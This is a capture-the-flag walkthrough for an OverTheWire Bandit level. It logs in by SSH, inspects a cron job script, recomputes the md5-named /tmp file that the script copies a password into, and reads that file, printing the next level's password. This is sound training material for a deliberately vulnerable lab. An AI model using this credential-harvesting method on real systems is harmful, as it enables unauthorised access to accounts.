-----------------------------------------------------------------------------------------------------------------
"
A program is running automatically at regular intervals from cron, the time-based job scheduler. 
Look in /etc/cron.d/ for the configuration and see what command is being executed.
"
-----------------------------------------------------------------------------------------------------------------


sshpass -f "sshpass" ssh bandit22@bandit.labs.overthewire.org -p 2220

cd /etc/cron.d/

ls -la

cat cronjob_bandit23

>> @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
>> * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

cat /usr/bin/cronjob_bandit23.sh

>> ---
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
>> ---

echo I am user bandit23 | md5sum | cut -d ' ' -f 1

>> 8ca319486bfbbc3663ea0fbe81326349

cat /tmp/8ca319486bfbbc3663ea0fbe81326349

>> 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
